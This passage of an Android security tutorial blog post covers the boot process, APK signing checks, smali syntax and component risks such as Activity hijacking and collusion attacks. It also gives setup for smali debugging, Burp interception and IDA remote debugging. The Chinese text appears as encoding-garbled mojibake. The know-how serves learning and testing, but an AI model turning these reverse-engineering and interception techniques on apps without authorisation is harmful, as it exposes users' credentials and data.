Kernel</code></p></li></ul><p>æ€»ç»“ä¸€ä¸‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/android_stack.png" alt="img"></p><h4 id="è¿è¡Œæœºåˆ¶"><a href="#è¿è¡Œæœºåˆ¶" class="headerlink" title="è¿è¡Œæœºåˆ¶"></a>è¿è¡Œæœºåˆ¶</h4><p>å¯ä»¥å°†å…¶ç®€åŒ–ä¸ºä¸‰æ­¥ï¼š<code>Init</code>å¯åŠ¨ â€”â€“&gt; <code>Zygote</code>è¿›ç¨‹å¯åŠ¨ â€”â€”-&gt;<code>Systemserver</code>è¿›ç¨‹å¯åŠ¨</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%90%AF%E5%8A%A8_top.png" alt="img "></p><p>é¦–å…ˆæ˜¯<code>Init</code>è¿›ç¨‹å¯åŠ¨ï¼šä¸‹å›¾ä¸ºæŒ‰ä¸‹ç”µæºé”®åçš„å¯åŠ¨è¿‡ç¨‹ï¼ŒAndroidè®¾å¤‡å¯åŠ¨è¦ç»è¿‡3ä¸ªé˜¶æ®µï¼Œ<code>BootLoader</code>ã€<code>Linux Kernel</code>å’Œ<code>Android</code>ç³»ç»ŸæœåŠ¡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä»–ä»¬éƒ½ä¼šç›¸åº”çš„å¯åŠ¨å¯¹åŠ¨ç”»å¯¹åº”ã€‚ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%90%AF%E5%8A%A8_init.png" alt="img"></p><p>ä¸¥æ ¼ä¸Šè®²ï¼ŒAndroidç³»ç»Ÿå®é™…ä¸Šæ˜¯è¿è¡ŒäºLinuxå†…æ ¸ä¹‹ä¸Šçš„ä¸€ç³»åˆ—â€æœåŠ¡è¿›ç¨‹â€ï¼Œå¹¶ä¸ç®—ä¸€ä¸ªå®Œæˆæ„ä¹‰ä¸Šçš„**â€æ“ä½œç³»ç»Ÿâ€**ï¼›è€Œè¿™ä¸€ç³»åˆ—è¿›ç¨‹æ˜¯ç»´æŒAndroidè®¾å¤‡æ­£å¸¸å·¥ä½œçš„å…³é”®ï¼Œæ‰€ä»¥å®ƒä»¬è‚¯å®šæœ‰ä¸€ä¸ªâ€æ ¹è¿›ç¨‹â€ï¼Œè¿™ä¸ªâ€æ ¹è¿›ç¨‹â€è¡ç”Ÿå‡ºäº†è¿™ä¸€ç³»åˆ—è¿›ç¨‹ã€‚è¿™ä¸ªâ€æ ¹è¿›ç¨‹â€å°±æ˜¯initè¿›ç¨‹ã€‚initè¿›ç¨‹æ˜¯Androidç³»ç»Ÿå¯åŠ¨çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ã€‚å®ƒé€šè¿‡è§£æinit.rcè„šæœ¬æ¥æ„å»ºå‡ºç³»ç»Ÿçš„åˆå§‹å½¢æ€ã€‚å…¶ä»–çš„â€ä¸€ç³»åˆ—â€Androidç³»ç»Ÿè¿›ç¨‹å¤§éƒ¨åˆ†ä¹Ÿæ˜¯é€šè¿‡â€init.rcâ€æ¥å¯åŠ¨çš„ã€‚å› ä¸ºè¦å…¼å®¹ä¸åŒçš„å¼€å‘å•†ï¼Œæ‰€ä»¥init.rcè„šæœ¬çš„è¯­æ³•å¾ˆç®€å•ï¼Œå¹¶ä¸”é‡‡ç”¨çš„æ˜¯çº¯æ–‡æœ¬ç¼–è¾‘çš„ï¼Œè¿™æ ·å¯¼è‡´å®ƒå¯è¯»æ€§å°±ä¼šå¾ˆé«˜ã€‚</p><p><code>init</code>æ˜¯<code>Linux</code>ç³»ç»Ÿä¸­ç”¨æˆ·ç©ºé—´çš„ç¬¬ä¸€ä¸ªè¿›ç¨‹(pid&#x3D;1)ï¼Œ<code>Linux Kernel</code>å¯åŠ¨åï¼Œä¼šè°ƒç”¨<a href="https://link.jianshu.com/?t=http://androidxref.com/6.0.1_r10/xref/system/core/init/init.cpp">&#x2F;system&#x2F;core&#x2F;init&#x2F;Init.cpp</a>çš„<code>main()</code>æ–¹æ³•ã€‚</p><p>Zygoteè¿›ç¨‹å¯åŠ¨ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%90%AF%E5%8A%A8_zygote.png" alt="img"></p><h3 id="Androidåº”ç”¨æ¸—é€æµ‹è¯•ä¸è°ƒè¯•"><a href="#Androidåº”ç”¨æ¸—é€æµ‹è¯•ä¸è°ƒè¯•" class="headerlink" title="Androidåº”ç”¨æ¸—é€æµ‹è¯•ä¸è°ƒè¯•"></a>Androidåº”ç”¨æ¸—é€æµ‹è¯•ä¸è°ƒè¯•</h3><p>æ‰€éœ€å·¥å…·ï¼š</p><ul><li>Android Debug Bridge (ADB)ï¼Œå®ƒæ˜¯Androidå¼€å‘&#x2F;æµ‹è¯•äººå‘˜ä¸å¯æ›¿ä»£çš„å¼ºå¤§å·¥å…·ã€‚</li><li>Apktoolï¼Œåˆåâ€œAndroidçš„Burpå¥—ä»¶â€ï¼Œæ˜¯ç”¨äºAndroidæ”»å‡»çš„å¿…å¤‡å·¥å…·ã€‚å¯ä»¥è§£å‹åç¼–è¯‘apkæ–‡ä»¶ï¼Œå¹¶ä¿®æ”¹åé‡æ–°æ‰“åŒ…ã€‚</li><li>Android Studioï¼Œç”¨äºAndroidå¼€å‘çš„æ ‡å‡†ç¯å¢ƒï¼Œå¯ä»¥ç”¨å®ƒæ¥ä¿®æ”¹ç¨‹åºã€‚</li><li>BurpSuiteï¼Œå¯ä»¥ç”¨ä½œä»£ç†æ¥æ£€æŸ¥å¾€è¿”äºæµ‹è¯•è®¾å¤‡çš„æµé‡ã€‚</li><li>Firdaï¼Œå¯ä»¥å°†è‡ªå·±çš„è„šæœ¬æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºçš„è¿è¡Œè¿›ç¨‹ä¸­ã€‚å¯ä»¥ç”¨äºæ£€æŸ¥è¢«è°ƒç”¨çš„åŠŸèƒ½ï¼Œåº”ç”¨ç¨‹åºçš„ç½‘ç»œè¿æ¥ä»¥åŠç»•è¿‡è¯ä¹¦å›ºå®šã€‚</li><li>Jadxï¼Œåç¼–è¯‘å·¥å…·ã€‚</li></ul><h4 id="æ–‡ä»¶æ ¼å¼"><a href="#æ–‡ä»¶æ ¼å¼" class="headerlink" title="æ–‡ä»¶æ ¼å¼"></a>æ–‡ä»¶æ ¼å¼</h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E5%BA%94%E7%94%A8%E6%A0%BC%E5%BC%8F.png" alt="img"></p><h4 id="å®‰è£…åŒ…ç­¾åæ•ˆéªŒ"><a href="#å®‰è£…åŒ…ç­¾åæ•ˆéªŒ" class="headerlink" title="å®‰è£…åŒ…ç­¾åæ•ˆéªŒ"></a>å®‰è£…åŒ…ç­¾åæ•ˆéªŒ</h4><p>åœ¨æ¶ˆæ¯é€šä¿¡æ—¶ï¼Œå¿…é¡»è‡³å°‘è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼šä¸€æ˜¯ç¡®ä¿æ¶ˆæ¯æ¥æºçš„çœŸå®æ€§ï¼ŒäºŒæ˜¯ç¡®ä¿æ¶ˆæ¯ä¸ä¼šè¢«ç¬¬ä¸‰æ–¹ç¯¡æ”¹ã€‚åœ¨å®‰è£…Apkæ—¶ï¼ŒåŒæ ·éœ€è¦ç¡®ä¿Apkæ¥æºçš„çœŸå®æ€§ï¼Œä»¥åŠApkæ²¡æœ‰è¢«ç¬¬ä¸‰æ–¹ç¯¡æ”¹ã€‚å¦‚ä½•è§£å†³è¿™ä¸¤ä¸ªé—®é¢˜å‘¢ï¼Ÿæ–¹æ³•å°±æ˜¯å¼€å‘è€…å¯¹Apkè¿›è¡Œç­¾åï¼šåœ¨Apkä¸­å†™å…¥ä¸€ä¸ªâ€œæŒ‡çº¹â€ã€‚æŒ‡çº¹å†™å…¥ä»¥åï¼ŒApkä¸­æœ‰ä»»ä½•ä¿®æ”¹ï¼Œéƒ½ä¼šå¯¼è‡´è¿™ä¸ªæŒ‡çº¹æ— æ•ˆï¼ŒAndroidç³»ç»Ÿåœ¨å®‰è£…Apkè¿›è¡Œç­¾åæ ¡éªŒæ—¶å°±ä¼šä¸é€šè¿‡ï¼Œä»è€Œä¿è¯äº†å®‰å…¨æ€§ã€‚</p><p>è¦äº†è§£å¦‚ä½•å®ç°ç­¾åï¼Œéœ€è¦äº†è§£ä¸¤ä¸ªåŸºæœ¬æ¦‚å¿µï¼šæ•°å­—æ‘˜è¦å’Œæ•°å­—è¯ä¹¦ã€‚</p><ul><li>æ•°å­—æ‘˜è¦ï¼Œå°†ä»»æ„é•¿åº¦çš„æ¶ˆæ¯å˜æˆå›ºå®šé•¿åº¦çš„çŸ­æ¶ˆæ¯ï¼Œå®ƒç±»ä¼¼äºä¸€ä¸ªè‡ªå˜é‡æ˜¯æ¶ˆæ¯çš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯Hashå‡½æ•°ã€‚æ•°å­—æ‘˜è¦å°±æ˜¯é‡‡ç”¨å•å‘Hashå‡½æ•°å°†éœ€è¦åŠ å¯†çš„æ˜æ–‡â€œæ‘˜è¦â€æˆä¸€ä¸²å›ºå®šé•¿åº¦çš„å¯†æ–‡ï¼Œè¿™ä¸€ä¸²å¯†æ–‡åˆç§°ä¸ºæ•°å­—æŒ‡çº¹ï¼Œå®ƒæœ‰å›ºå®šçš„é•¿åº¦ï¼Œè€Œä¸”ä¸åŒçš„æ˜æ–‡æ‘˜è¦æˆå¯†æ–‡ï¼Œå…¶ç»“æœæ€»æ˜¯ä¸åŒçš„ï¼Œè€ŒåŒæ ·çš„æ˜æ–‡å…¶æ‘˜è¦å¿…å®šä¸€è‡´ã€‚</li></ul><p>å¦‚ä½•æ•ˆéªŒï¼š<img src="http://handsomedog.top/wp-content/uploads//2020/01/%E7%AD%BE%E5%90%8D%E6%95%88%E9%AA%8C.webp" alt="img"></p><ul><li>æ•°å­—è¯ä¹¦ï¼Œæ¥æ”¶æ–¹å¿…é¡»è¦çŸ¥é“å‘é€æ–¹çš„å…¬é’¥å’Œæ‰€ä½¿ç”¨çš„ç®—æ³•ã€‚å¦‚æœæ•°å­—ç­¾åå’Œå…¬é’¥ä¸€èµ·è¢«ç¯¡æ”¹ï¼Œæ¥æ”¶æ–¹æ— æ³•å¾—çŸ¥ï¼Œè¿˜æ˜¯ä¼šæ ¡éªŒé€šè¿‡ã€‚å¦‚ä½•ä¿è¯å…¬é’¥çš„å¯é æ€§å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æ•°å­—è¯ä¹¦ï¼Œæ•°å­—è¯ä¹¦æ˜¯èº«ä»½è®¤è¯æœºæ„ï¼ˆCertificate Authorityï¼‰é¢å‘çš„ï¼ŒåŒ…å«äº†ä»¥ä¸‹ä¿¡æ¯ï¼šè¯ä¹¦é¢å‘æœºæ„ã€è¯ä¹¦é¢å‘æœºæ„ç­¾åã€è¯ä¹¦ç»‘å®šçš„æœåŠ¡å™¨åŸŸåã€è¯ä¹¦ç‰ˆæœ¬ã€æœ‰æ•ˆæœŸã€ç­¾åä½¿ç”¨çš„åŠ å¯†ç®—æ³•ï¼ˆéå¯¹ç§°ç®—æ³•ï¼Œå¦‚RSAï¼‰ã€å…¬é’¥ã€‚</li></ul><p>å®Œæ•´çš„æ•ˆéªŒè¿‡ç¨‹ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E5%AE%8C%E6%95%B4.webp" alt="img"></p><p>Androidæä¾›äº†ä¸¤ç§å¯¹Apkçš„ç­¾åæ–¹å¼ï¼Œä¸€ç§æ˜¯åŸºäºJARçš„ç­¾åæ–¹å¼ï¼Œå¦ä¸€ç§æ˜¯åŸºäºApkçš„ç­¾åæ–¹å¼ï¼Œå®ƒä»¬çš„ä¸»è¦åŒºåˆ«åœ¨äºä½¿ç”¨çš„ç­¾åæ–‡ä»¶ä¸ä¸€æ ·ï¼šjarsignerä½¿ç”¨keystoreæ–‡ä»¶è¿›è¡Œç­¾åï¼›apksigneré™¤äº†æ”¯æŒä½¿ç”¨keystoreæ–‡ä»¶è¿›è¡Œç­¾åå¤–ï¼Œè¿˜æ”¯æŒç›´æ¥æŒ‡å®špemè¯ä¹¦æ–‡ä»¶å’Œç§é’¥è¿›è¡Œç­¾åã€‚</p><p>ç›¸å…³ç­¾åå‘½ä»¤ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jarsigner </span>-verify apkpath<br><span class="hljs-keyword">jarsigner </span>--verbose -certs apkpath<br>keytool -list -v -keystore keystore_file -storepass pwd<br>keytool -printcert -<span class="hljs-keyword">jarfile </span>apk<br></code></pre></td></tr></table></figure><h4 id="smaliä»£ç "><a href="#smaliä»£ç " class="headerlink" title="smaliä»£ç "></a>smaliä»£ç </h4><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/smali%E7%B1%BB%E5%9E%8B.png" alt="img"></p><p><strong>å¯¹è±¡</strong>ä»¥<code>Lpackage/name/ObjectName;</code>çš„å½¢å¼è¡¨ç¤ºã€‚å‰é¢çš„<code>L</code>è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¯¹è±¡ç±»å‹ï¼Œ<code>package/name/</code>æ˜¯è¯¥å¯¹è±¡æ‰€åœ¨çš„åŒ…ï¼Œ<code>ObjectName</code>æ˜¯å¯¹è±¡çš„åå­—ï¼Œ<code>;</code>è¡¨ç¤ºå¯¹è±¡åç§°çš„ç»“æŸã€‚ç›¸å½“äº<code>java</code>ä¸­çš„<code>package.name.ObjectName</code>ã€‚</p><p>ä¾‹å¦‚ï¼š<code>Ljava/lang/String;</code>ç›¸å½“äº<code>java.lang.String</code></p><p><strong>æ•°ç»„çš„è¡¨ç¤ºå½¢å¼</strong></p><p><code>[I</code>ï¼Œè¡¨ç¤ºä¸€ä¸ªæ•´å‹ä¸€ç»´æ•°ç»„ï¼Œç›¸å½“äº<code>java</code>ä¸­çš„<code>int[]</code>ã€‚å¯¹äºå¤šç»´æ•°ç»„ï¼Œåªè¦å¢åŠ <code>[</code>å°±è¡Œäº†ã€‚<code>[[I</code>ç›¸å½“äº<code>int[][]</code>ï¼Œ<code>[[[I</code>ç›¸å½“äº<code>int[][][]</code>ã€‚</p><p><strong>å¯¹è±¡æ•°ç»„çš„è¡¨ç¤º</strong></p><p><code>[Ljava/lang/String;</code>è¡¨ç¤ºä¸€ä¸ª<code>String</code>å¯¹è±¡æ•°ç»„ã€‚</p><p><strong>æ–¹æ³•</strong>é€šå¸¸å¿…é¡»è¯¦ç»†çš„æŒ‡å®šæ–¹æ³•ç±»å‹<code>ï¼ˆï¼Ÿthe type that contains the methodï¼‰</code> æ–¹æ³•åï¼Œå‚æ•°ç±»å‹ï¼Œè¿”å›ç±»å‹ï¼Œæ‰€æœ‰è¿™äº›ä¿¡æ¯éƒ½æ˜¯ä¸ºè™šæ‹Ÿæœºæ˜¯èƒ½å¤Ÿæ‰¾åˆ°æ­£ç¡®çš„æ–¹æ³•å¹¶æ‰§è¡Œã€‚</p><p>æ–¹æ³•è¡¨ç¤ºå½¢å¼ï¼š<code>Lpackage/name/ObjectName;-&gt;MethodName(III)Z</code></p><p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œ<code>Lpackage/name/ObjectName;</code>è¡¨ç¤ºç±»å‹ï¼Œ<code>MethodName</code>æ˜¯æ–¹æ³•åã€‚<code>III</code>ä¸ºå‚æ•°ï¼ˆåœ¨æ­¤æ˜¯3ä¸ªæ•´å‹å‚æ•°ï¼‰ï¼Œ<code>Z</code>æ˜¯è¿”å›ç±»å‹ï¼ˆ<code>boolean</code>ï¼‰ã€‚</p><p>æ–¹æ³•çš„å‚æ•°æ˜¯ä¸€ä¸ªæ¥ä¸€ä¸ªçš„ï¼Œä¸­é—´æ²¡æœ‰éš”å¼€ã€‚</p><p>ä¸€ä¸ªæ›´å¤æ‚çš„ä¾‹å­ï¼š<code>method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;</code></p><p>åœ¨javaä¸­åˆ™ä¸ºï¼š<code>String method(int, int[][], int, String, Object[])</code></p><h4 id="ç»„ä»¶å®‰å…¨"><a href="#ç»„ä»¶å®‰å…¨" class="headerlink" title="ç»„ä»¶å®‰å…¨"></a>ç»„ä»¶å®‰å…¨</h4><ul><li><code>Activity</code>ï¼š<ul><li>å…³äºè‡ªå®šä¹‰æƒé™ã€‚å‚æ•°ä»‹ç»ï¼Œ<code>name</code>ï¼šæƒé™åï¼Œ<code>protectionLevel</code>ï¼šæƒé™çº§åˆ«ã€‚æƒé™çº§åˆ«ä»‹ç»ï¼š</li><li><code>normal</code>ï¼šæ­£å¸¸æƒé™ï¼Œè¯¥æƒé™å¹¶ä¸ä¼šç»™ç”¨æˆ·æˆ–è€…è®¾å¤‡çš„éšç§å¸¦æ¥é£é™©ï¼Œä¸å£°æ˜é»˜è®¤ä¸º<code>nomal</code>ã€‚</li><li><code>dangerous</code>ï¼šå±é™©æƒé™ï¼Œè¯¥çº§åˆ«çš„æƒé™é€šå¸¸ä¼šç»™ç”¨æˆ·çš„æ•°æ®æˆ–è®¾å¤‡çš„éšç§å¸¦æ¥é£é™©ï¼Œ<code>Android6.0</code>ä»¥ä¸Šéœ€è¦åŠ¨æ€ç”³è¯·</li><li><code>signature</code>ï¼šåªæœ‰ç›¸åŒç­¾åçš„åº”ç”¨æ‰èƒ½ä½¿ç”¨è¯¥æƒé™</li></ul></li></ul><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AF%BC%E5%87%BA.png" alt="img"></p><ul><li><p><strong>ActivityåŠ«æŒ</strong>ï¼Œå½“ç”¨æˆ·å®‰è£…äº†å¸¦æœ‰<code>Activity</code>åŠ«æŒåŠŸèƒ½çš„æ¶æ„ç¨‹åºåï¼Œæ¶æ„ç¨‹åºä¼šéå†ç³»ç»Ÿä¸­è¿è¡Œçš„ç¨‹åºï¼Œå½“æ£€æµ‹åˆ°éœ€è¦åŠ«æŒçš„<code>Activity</code>ï¼ˆé€šå¸¸æ˜¯ç½‘é“¶æˆ–å…¶ä»–ç½‘ç»œç¨‹åºçš„ç­‰ç™»é™†ç•Œé¢ï¼‰åœ¨å‰å°è¿è¡Œæ—¶ï¼Œæ¶æ„ç¨‹åºå°±ä¼šå¯åŠ¨ä¸€ä¸ªå¸¦<code>FLAG_ACTIVITY_NEW_TASK</code>æ ‡å¿—çš„é’“é±¼å¼<code>Activity</code>è¦†ç›–æ­£å¸¸çš„<code>Activity</code>ï¼Œä»è€Œæ¬ºéª—è¾“å…¥ç”¨æˆ·åæˆ–å¯†ç ä¿¡æ¯ï¼Œå½“ç”¨æˆ·è¾“å…¥å®Œä¿¡æ¯åï¼Œç¨‹åºå°±ä¼šå°†ä¿¡æ¯å‘é€åˆ°æŒ‡å®šçš„ç½‘å€æˆ–é‚®ç®±ï¼Œç„¶ååˆ‡æ¢åˆ°æ­£å¸¸çš„<code>Activity</code>ä¸­ã€‚è¿™å°±æ˜¯<code>Activity</code>åŠ«æŒåŸç†ã€‚ä»å—å½±å“çš„è§’åº¦çœ‹ï¼Œ<code>Activity</code>å±äºç”¨æˆ·å±‚å®‰å…¨ã€‚</p></li><li><p><strong>ä¸²è°‹æ”»å‡»</strong>ï¼Œä¸¾ä¾‹ï¼Œ<code>app A</code>æœ¬èº«æ— ä»»ä½•æƒé™ï¼Œå®ƒæƒ³è¦â€œè”ç½‘å¹¶ä¸‹è½½æŸä¸ªæ–‡ä»¶åˆ°<code>sd</code>å¡ä¸Šâ€ï¼Œè¿™åœ¨æ­£å¸¸æƒ…å†µä¸‹æ˜¯ä¸å…è®¸çš„ï¼Œ<code>app B</code>æ‹¥æœ‰è”ç½‘ä¸å†™<code>sd</code>å¡çš„æƒé™ï¼Œå¹¶å®ç°äº†æ–‡ä»¶ä¸‹è½½ä¸ä¿å­˜åŠŸèƒ½ã€‚æ­¤æ—¶å‘¢ï¼Œ<code>A</code>å¯ä»¥é€šè¿‡è®¿é—®<code>B</code>æ¥å®ç°æ–‡ä»¶çš„ä¸‹è½½ï¼Œä»è€Œçªç ´<code>Android</code>ç³»ç»Ÿçš„æƒé™æ§åˆ¶ã€‚</p></li><li><p>Service</p><ul><li><code>Service</code>ç»„ä»¶æ˜¯<code>Android</code>ç³»ç»Ÿä¸­çš„åå°è¿›ç¨‹ï¼Œä¸»è¦çš„åŠŸèƒ½æ˜¯åœ¨åå°è¿›è¡Œä¸€äº›è€—æ—¶çš„æ“ä½œã€‚ä¸å…¶ä»–çš„<code>Android</code>ç»„ä»¶ä¸€æ ·ï¼Œå½“å£°æ˜<code>Service</code>æ—¶æŒ‡å®šäº†<code>Intent</code>è¿‡æ»¤å™¨ï¼Œè¯¥<code>Service</code>é»˜è®¤å°±å¯ä»¥è¢«å¤–éƒ¨è®¿é—®ã€‚å¯ä»¥è®¿é—®çš„æ–¹æ³•æœ‰ï¼š</li></ul><p><code>startService()</code>ï¼šå¯åŠ¨æœåŠ¡ï¼Œå¯ä»¥è¢«ç”¨æ¥å®ç°ä¸²è°‹æ”»å‡»ã€‚</p><p><code>bindService()</code>ï¼šç»‘å®šæœåŠ¡ï¼Œå¯ä»¥è¢«ç”¨æ¥å®ç°ä¸²è°‹æ”»å‡»ã€‚</p><p><code>stopService()</code>ï¼šåœæ­¢æœåŠ¡ï¼Œå¯¹ç¨‹åºåŠŸèƒ½è¿›è¡Œæ¶æ„ç ´åã€‚</p><p>å¯¹äºæ¶æ„çš„<code>stopService</code>ï¼Œå®ƒç ´è§£ç¨‹åºçš„æ‰§è¡Œç¯å¢ƒï¼Œç›´æ¥å½±å“åˆ°ç¨‹åºçš„æ­£å¸¸è¿è¡Œã€‚è¦æƒ³æœç»<code>Service</code>ç»„ä»¶è¢«äººæ¶æ„çš„å¯åŠ¨æˆ–è€…åœæ­¢ï¼Œå°±éœ€è¦ä½¿ç”¨<code>Android</code>ç³»ç»Ÿçš„æƒé™æœºåˆ¶æ¥å¯¹è°ƒç”¨è€…è¿›è¡Œæ§åˆ¶ã€‚å¦‚æœServiceç»„ä»¶ä¸æƒ³è¢«ç¨‹åºå¤–çš„å…¶ä»–ç»„ä»¶è®¿é—®ï¼Œå¯ä»¥ç›´æ¥è®¾ç½®å®ƒçš„<code>android:exported</code>å±æ€§ä¸º<code>false</code>ï¼Œå¦‚æœæ˜¯åŒä¸€ä½œè€…çš„å¤šä¸ªç¨‹åºå…±äº«ä½¿ç”¨è¯¥æœåŠ¡ï¼Œåˆ™å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰çš„æƒé™ã€‚</p></li></ul><h4 id="WebViewå®‰å…¨"><a href="#WebViewå®‰å…¨" class="headerlink" title="WebViewå®‰å…¨"></a>WebViewå®‰å…¨</h4><ul><li>WebViewä»»æ„ä»£ç æ‰§è¡Œ</li><li>WebViewå¯†ç æ˜æ–‡å­˜å‚¨</li><li>WebViewåŸŸæ§åˆ¶ä¸ä¸¥æ ¼</li></ul><h4 id="æ•æ„Ÿä¿¡æ¯å®‰å…¨"><a href="#æ•æ„Ÿä¿¡æ¯å®‰å…¨" class="headerlink" title="æ•æ„Ÿä¿¡æ¯å®‰å…¨"></a>æ•æ„Ÿä¿¡æ¯å®‰å…¨</h4><ul><li>è¯ä¹¦æ–‡ä»¶</li><li>é€»è¾‘jsæ–‡ä»¶</li><li>logcatæ—¥å¿—</li><li>å›¾ç‰‡æ–‡ä»¶</li><li>å…¶ä»–æ–‡ä»¶</li><li>è¿›ç¨‹å®‰å…¨ï¼Œå†…å­˜è®¿é—®å’Œä¿®æ”¹ï¼Œé€šè¿‡å¯¹å®¢æˆ·ç«¯å†…å­˜çš„è®¿é—®ï¼Œæœ‰å¯èƒ½ä¼šå¾—åˆ°ä¿å­˜åœ¨å†…å­˜ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ç™»å½•å¯†ç ï¼Œè´¦å·ç­‰ï¼‰ã€‚æµ‹è¯•å®¢æˆ·ç«¯å†…å­˜ä¸­æ˜¯å¦å­˜åœ¨çš„æ•æ„Ÿä¿¡æ¯ï¼ˆå¡å·ã€æ˜æ–‡å¯†ç ç­‰ï¼‰ã€‚</li><li>æœ¬åœ°ç«¯å£å¼€æ”¾æ£€æµ‹</li><li>å¤–éƒ¨åŠ¨æ€åŠ è½½DEXå®‰å…¨é£é™©æ£€æµ‹</li></ul><h4 id="Android-Studioè°ƒè¯•Smalié…ç½®"><a href="#Android-Studioè°ƒè¯•Smalié…ç½®" class="headerlink" title="Android Studioè°ƒè¯•Smalié…ç½®"></a>Android Studioè°ƒè¯•Smalié…ç½®</h4><p>æˆ‘çš„Android Studioç‰ˆæœ¬æ˜¯ï¼š<code>3.5.3</code>ï¼Œæ¨¡æ‹Ÿå™¨ä¸º<code>Android 9.0</code>ã€‚</p><p>1ã€åœ¨<code>Android Studio</code>ä¸Šå®‰è£…<code>smalidea</code>æ’ä»¶ï¼Œè¿™ä¸ªæ’ä»¶éœ€è¦ä¸‹è½½åå®‰è£…ï¼Œ<code>File-&gt;Setting-&gt;Plugins-&gt;install from disk</code>ã€‚</p><p>2ã€å®‰è£…<code>Apktool</code>ï¼ŒæŒ‰ç…§å®˜ç½‘æ•™ç¨‹å³å¯ã€‚</p><p>3ã€ä½¿ç”¨<code>Android Studio</code>å°†<code>apktool</code>åç¼–è¯‘åæ–‡ä»¶å¤¹ä½œä¸ºé¡¹ç›®å¯¼å…¥ï¼Œ<code>File -&gt; New -&gt; Import project</code>ã€‚</p><p>4ã€é…ç½®é¡¹ç›®<code>configuration</code>ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/debug_smali_1.png" alt="img"></p><p>5ã€æ¥ä¸‹æ¥é…ç½®SDKï¼Œ<code>File -&gt; project structure -&gt; sdk</code>ã€‚</p><p>6ã€ä»<code>AVD manager</code>å¯åŠ¨æ¨¡æ‹Ÿå™¨ï¼Œè¿›å…¥å¼€å‘è€…é€‰é¡¹ï¼Œé€‰æ‹©<code>debug application</code>ï¼Œæ‰“å¼€<code>wait for debugger</code>ã€‚</p><p>7ã€å¼€å§‹debugger Attachï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/debug_smali_2.png" alt="img"></p><p>è¿›è¡Œè°ƒè¯•ï¼š</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/debug_smali_3.png" alt="img"></p><h4 id="Androidæ¨¡æ‹Ÿå™¨ä½¿ç”¨burpsuiteæŠ“åŒ…"><a href="#Androidæ¨¡æ‹Ÿå™¨ä½¿ç”¨burpsuiteæŠ“åŒ…" class="headerlink" title="Androidæ¨¡æ‹Ÿå™¨ä½¿ç”¨burpsuiteæŠ“åŒ…"></a>Androidæ¨¡æ‹Ÿå™¨ä½¿ç”¨burpsuiteæŠ“åŒ…</h4><p>æˆ‘ä½¿ç”¨çš„<code>Android Studio</code>å¸¦çš„å®˜æ–¹æ¨¡æ‹Ÿå™¨ï¼Œåœ¨ç”µè„‘ä¸Šå¼€å¯<code>burpsuite</code>ï¼Œæ‰“å¼€<code>options</code>æ·»åŠ ç”µè„‘åœ¨å±€åŸŸç½‘ä¸­çš„<code>ip</code>ï¼Œç›‘å¬ç«¯å£ï¼ˆä»»æ„æŒ‡å®šï¼‰ã€‚æ‰“å¼€å¯åŠ¨çš„<code>AVD</code>çš„<code>setting</code>ï¼Œå…¶ä¸­æœ‰<code>proxy</code>è®¾ç½®ï¼Œè®¾ç½®ä¸ºå¯¹åº”çš„ipå’Œç«¯å£å³å¯ã€‚</p><p>è¿™é‡Œæ‰‹æœºä¸Šå®‰è£…burpè¯ä¹¦éœ€è¦ç‰¹åˆ«è¯´æ˜ä¸€ä¸‹ï¼Œéœ€è¦æŠŠåç¼€<code>.der</code>ä¿®æ”¹ä¸º<code>.cer</code>ã€‚</p><p><img src="http://handsomedog.top/wp-content/uploads//2020/01/burp_grab.png" alt="img"></p><h4 id="IDA-proè°ƒè¯•-soåº“"><a href="#IDA-proè°ƒè¯•-soåº“" class="headerlink" title="IDA proè°ƒè¯•.soåº“"></a>IDA proè°ƒè¯•.soåº“</h4><p>1ã€å°†<code>IDA</code>å®‰è£…ç›®å½•ä¸‹çš„<code>dbgsrv</code>å¤åˆ¶åˆ°<code>AVD</code>ä¸­ï¼Œ<code>adb shell</code>å¯åŠ¨è¿è¡Œã€‚</p><p>2ã€<code>adb forward tcp:23946 tcp:23946</code>ï¼Œè¿›è¡Œç«¯å£è½¬å‘ï¼Œ<code>IDA</code>éšå<code>remote attach</code>è¿›ç¨‹ï¼Œ<code>ip</code>ä¸º<code>localhost</code>ï¼Œç«¯å£<code>23946</code>ã€‚</p><h3 id="ç§»åŠ¨åº”ç”¨æ¸—é€æµ‹è¯•æ¡†æ¶ä½¿ç”¨"><a href="#ç§»åŠ¨åº”ç”¨æ¸—é€æµ‹è¯•æ¡†æ¶ä½¿ç”¨" class="headerlink" title="ç§»åŠ¨åº”ç”¨æ¸—é€æµ‹è¯•æ¡†æ¶ä½¿ç”¨"></a>ç§»åŠ¨åº”ç”¨æ¸—é€æµ‹è¯•æ¡†æ¶ä½¿ç”¨</h3><h3 id="Xposedæ¡†æ¶"><a href="#Xposedæ¡†æ¶" class="headerlink" title="Xposedæ¡†æ¶"></a>Xposedæ¡†æ¶</h3><h3 id="frida-æ¡†æ¶"><a href="#frida-æ¡†æ¶" 